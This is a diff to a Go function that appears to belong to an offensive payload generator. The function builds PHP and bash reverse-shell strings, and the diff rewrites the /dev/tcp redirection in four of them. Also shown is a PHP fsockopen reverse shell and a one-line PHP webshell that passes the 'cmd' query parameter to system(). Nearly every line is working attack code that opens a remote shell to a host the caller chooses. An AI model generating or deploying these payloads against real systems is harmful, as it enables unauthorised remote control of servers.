@@ -53,13 +53,13 @@ func (c pbuild)shells() string {
 			if c.version == "default" {
 				s = `php -r '$sock=fsockopen("`+c.host+`",`+c.port+`);exec("/bin/sh -i <&3 >&3 2>&3");'`
 			} else if c.version == "" {
-				s = `exec("/bin/bash -c 'bash -i > /dev/tcp/`+c.host+`/`+c.port+` 0>&1'");`
+				s = `exec("/bin/bash -c 'bash -i &>/dev/tcp/`+c.host+`/`+c.port+` <&1'");`
 			} else if c.version == "exec-reverseshell-full" {
-				s = `<?php exec("/bin/bash -c 'bash -i > /dev/tcp/`+c.host+`/`+c.port+` 0>&1'"); ?>`
+				s = `<?php exec("/bin/bash -c 'bash -i &>/dev/tcp/`+c.host+`/`+c.port+` <&1'"); ?>`
 			} else if c.version == "system-reverseshell" {
-				s = `system("/bin/bash -c 'bash -i > /dev/tcp/`+c.host+`/`+c.port+` 0>&1'");`
+				s = `system("/bin/bash -c 'bash -i &>/dev/tcp/`+c.host+`/`+c.port+` <&1'");`
 			} else if c.version == "system-reverseshell-full" {
-				s = `<?php system("/bin/bash -c 'bash -i > /dev/tcp/`+c.host+`/`+c.port+` 0>&1'"); ?>`
+				s = `<?php system("/bin/bash -c 'bash -i &>/dev/tcp/`+c.host+`/`+c.port+` <&1'"); ?>`
 			} else if c.version == "webshell" {
 				s = `<?php system($_GET["cmd"]);?>`
 			}
